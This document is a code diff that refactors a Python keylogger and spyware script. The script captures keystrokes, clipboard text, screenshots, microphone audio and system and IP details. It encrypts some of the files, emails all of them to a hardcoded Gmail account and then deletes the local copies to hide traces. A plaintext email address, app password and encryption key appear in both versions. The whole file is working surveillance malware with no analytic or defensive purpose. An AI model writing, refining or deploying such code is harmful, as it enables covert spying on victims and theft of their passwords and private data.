@@ -1,104 +1,95 @@
-# Libraries
-from pynput.keyboard import Key, Listener
-
+# ----------------------------
+#          Imports
+# ----------------------------
+import os
+import time
+import socket
+import platform
+import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import smtplib
-
-import os
-
-import socket
-import platform
-
 from requests import get
-
+from cryptography.fernet import Fernet
+from pynput.keyboard import Key, Listener
 import win32clipboard
-
 from scipy.io.wavfile import write
 import sounddevice as sd
-
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-import time
+# ----------------------------
+#        Config/Constants
+# ----------------------------
+KEY = b"1z68XoIR--DJZbrMdkE6e13ESaUMnFW0NCEYuFHSfc4="
+FROM_EMAIL = "francopanko6@gmail.com"
+EMAIL_PASSWORD = "wucm qbdz kwlx puop"
+TO_EMAIL = FROM_EMAIL
 
-from cryptography.fernet import Fernet
+LOG_FILE = 'key_log.txt'
+SYSTEM_INFO_FILE = 'system.txt'
+CLIPBOARD_FILE = 'clipboard.txt'
+AUDIO_FILE = 'audio.wav'
+SCREENSHOT_FILE = 'screenshot.png'
 
-# Extensions
-keys_info = 'key_log.txt'
-system_info = 'system.txt'
-audio_info = 'audio.wav'
-clipboard_info = 'clipboard.txt'
-screenshot_info = 'screenshot.png'
+ENCRYPTED_FILES = {
+    SYSTEM_INFO_FILE: 'e_system.txt',
+    CLIPBOARD_FILE: 'e_clipboard.txt',
+    LOG_FILE: 'e_key_log.txt',
+}
 
-# Encryption files
-system_info_e = 'e_system.txt'
-clipboard_info_e = 'e_clipboard.txt'
-keys_info_e = 'e_key_log.txt'
-
-key = "1z68XoIR--DJZbrMdkE6e13ESaUMnFW0NCEYuFHSfc4="
-
-fromaddr = "francopanko6@gmail.com"
-toaddr = fromaddr
-password = "wucm qbdz kwlx puop"
-
-# Sending email
-def send_email(fromaddr, password, toaddr, filename=keys_info):
-    try:    
-        # Create Message container
+# ----------------------------
+#        Email Function
+# ----------------------------
+def send_email(subject, body, attachment_path=None):
+    try:
         msg = MIMEMultipart()
-        msg['From'] = fromaddr
-        msg['To'] = toaddr
-        msg['Subject'] = "Keylogger Data"
+        msg['From'] = FROM_EMAIL
+        msg['To'] = TO_EMAIL
+        msg['Subject'] = subject
 
-        # Email body
-        body = "Attached is the latest keystroke log"
         msg.attach(MIMEText(body, 'plain'))
 
-        # Attaches log file
-        if os.path.exists(filename):
-            with open(filename, "rb") as attachment:
+        if attachment_path and os.path.exists(attachment_path):
+            with open(attachment_path, "rb") as attachment:
                 p = MIMEBase('application', 'octet-stream')
-                p.set_payload((attachment).read())
+                p.set_payload(attachment.read())
                 encoders.encode_base64(p)
-                p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+                p.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                 msg.attach(p)
-        else:
-            msg.attach(MIMEText("Log file not found.", 'plain'))
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
-            s.login(fromaddr, password)
-            s.sendmail(fromaddr, toaddr, msg.as_string())
-            print("Email sent successfully")
-    
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+            server.login(FROM_EMAIL, EMAIL_PASSWORD)
+            server.send_message(msg)
+
+        print(f"Email sent with {attachment_path or 'no attachment'}")
     except Exception as e:
         print(f"Failed to send email: {e}")
 
-send_email("francopanko6@gmail.com", "wucm qbdz kwlx puop", "francopanko6@gmail.com")
+# ----------------------------
+#     System Info / Clipboard
+# ----------------------------
+def get_system_info():
+    info = [
+        f"Hostname: {socket.gethostname()}",
+        f"Private IP Address: {socket.gethostbyname(socket.gethostname())}"
+    ]
+    try:
+        public_ip = get("https://api.ipify.org").text
+        info.append(f"Public IP Address: {public_ip}")
+    except:
+        info.append("Public IP Address: Unavailable")
 
-# Gathering computer information
+    info.extend([
+        f"Processor: {platform.processor()}",
+        f"System: {platform.system()} Version: {platform.version()}",
+        f"Machine: {platform.machine()}"
+    ])
 
-def get_computer_info():
-        with open(system_info, 'a') as f:
-            info = ""
-            info += f"Hostname: {socket.gethostname()}\n"
-            info += f"Private IP Address: {socket.gethostbyname(socket.gethostname())}\n"
-            try:
-                public_ip = get("https://api.ipify.org").text
-                info += f"Public IP Address: {public_ip}\n"
-            except:
-                info += f"Could not retireve Public IP Address (most likely max query)\n"
-            info += f"Processor: {platform.processor()}\n"
-            info += f"System: {platform.system()} Version: {platform.version()}\n"
-            info += f"Machine: {platform.machine()}\n"
-            f.write(info)
+    with open(SYSTEM_INFO_FILE, 'a') as f:
+        f.write('\n'.join(info) + '\n')
 
-get_computer_info()
-
-# Gathering clipboard information
-def get_clipboard():
+def get_clipboard_data():
     try:
         win32clipboard.OpenClipboard()
         if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
@@ -107,123 +98,96 @@ def get_clipboard():
             data = "Clipboard does not contain text"
         win32clipboard.CloseClipboard()
     except:
-        return "Clipboard could not be accessed. \n"
-            
-clipboard_data = get_clipboard()
+        data = "Clipboard could not be accessed."
 
-with open(clipboard_info, "a") as f:
-    f.write(clipboard_data)
+    with open(CLIPBOARD_FILE, 'a') as f:
+        f.write(data + '\n')
 
-# Microphone recording
-def microphone():
+# ----------------------------
+#     Microphone / Screenshot
+# ----------------------------
+def record_microphone(duration=10):
     freq = 44100
-    duration = 3600
-
     recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
     sd.wait()
-    
-    write(audio_info, freq, recording)
+    write(AUDIO_FILE, freq, recording)
 
-microphone()
-
-# Taking a Screenshot
-def screenshot():
+def take_screenshot():
     ss = ImageGrab.grab()
-    ss.save(screenshot_info)
-    ss.close()
+    ss.save(SCREENSHOT_FILE)
 
-# Timer
-iterations = 0
-end_iterations = 5
-time_iteration = 15
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
+# ----------------------------
+#         Keylogger
+# ----------------------------
+def write_keys(keys):
+    with open(LOG_FILE, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if 'space' in k:
+                f.write(' ')
+            elif 'enter' in k:
+                f.write('\n')
+            elif 'tab' in k:
+                f.write('   ')
+            elif 'Key' not in k:
+                f.write(k)
 
-
-while iterations < end_iterations:
-
-    # Logging Keys
+def start_keylogger(duration=60):
     keys = []
     count = 0
+    stop_time = time.time() + duration
 
     def on_press(key):
-        global keys, count
-
+        nonlocal keys, count
         keys.append(key)
         count += 1
-        currentTime = time.time()
-        
         if count >= 1:
-            count = 0
-            write_file(keys)
+            write_keys(keys)
             keys = []
-        
-    def write_file(keys):
-        with open(keys_info, 'a') as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write(' ')
-                if k.find("enter") > 0:
-                    f.write('\n')
-                if k.find("shift") > 0:
-                    f.write('')
-                if k.find("tab") > 0:
-                    f.write('   ')
-                elif k.find("Key") == -1:
-                    f.write(k)
+            count = 0
 
     def on_release(key):
-        if key == Key.esc:
-            # Stop listener
+        if key == Key.esc or time.time() > stop_time:
             return False
-        if currentTime > stoppingTime:
-            return False
-        
+
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    if currentTime > stoppingTime:
-        with open(keys_info, "w") as f:
-            f.write("")
-        
-        screenshot()
-        send_email(fromaddr, password, toaddr, screenshot_info)
+# ----------------------------
+#     File Encryption
+# ----------------------------
+def encrypt_file(source, dest):
+    if os.path.exists(source):
+        with open(source, 'rb') as f:
+            data = f.read()
+        encrypted = Fernet(KEY).encrypt(data)
+        with open(dest, 'wb') as f:
+            f.write(encrypted)
 
-        get_clipboard()
-        send_email(fromaddr, password, toaddr, clipboard_info)
+# ----------------------------
+#            Main
+# ----------------------------
+def main():
+    get_system_info()
+    get_clipboard_data()
+    take_screenshot()
+    record_microphone(duration=5)
+    start_keylogger(duration=30)
 
-        iterations += 1
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
+    send_email("System Info", "Attached is the system information.", SYSTEM_INFO_FILE)
+    send_email("Clipboard", "Attached is the clipboard data.", CLIPBOARD_FILE)
+    send_email("Screenshot", "Attached is a screenshot.", SCREENSHOT_FILE)
+    send_email("Audio", "Attached is a short audio clip.", AUDIO_FILE)
+    send_email("Keystrokes", "Attached is the keylog file.", LOG_FILE)
 
-# File Encryption
-files_to_encrypt = [system_info, clipboard_info, keys_info]
-encrypted_files = [system_info_e, clipboard_info_e, keys_info_e]
+    for src, dest in ENCRYPTED_FILES.items():
+        encrypt_file(src, dest)
+        send_email(f"Encrypted: {src}", "Encrypted file attached.", dest)
 
-count = 0
-
-for encrypting_file in files_to_encrypt:
-    with open(files_to_encrypt[count], 'rb') as f:
-        data = f.read()
-    
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-
-    with open(encrypted_files, 'wb') as f:
-        f.write(encrypted)
-    
-    send_email(fromaddr, password, toaddr, encrypted_files[count])
-    count += 1
-
-time.sleep(120)
-
-delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
-
-# Cleans up track and deletes files
-for file in delete_files:
-    os.remove(file)
+    time.sleep(10)
+    for f in [*ENCRYPTED_FILES.keys(), *ENCRYPTED_FILES.values(), AUDIO_FILE, SCREENSHOT_FILE]:
+        if os.path.exists(f):
+            os.remove(f)
 
 if __name__ == "__main__":
-    freeze_support()
-    Process(target=screenshot).start()
+    main()
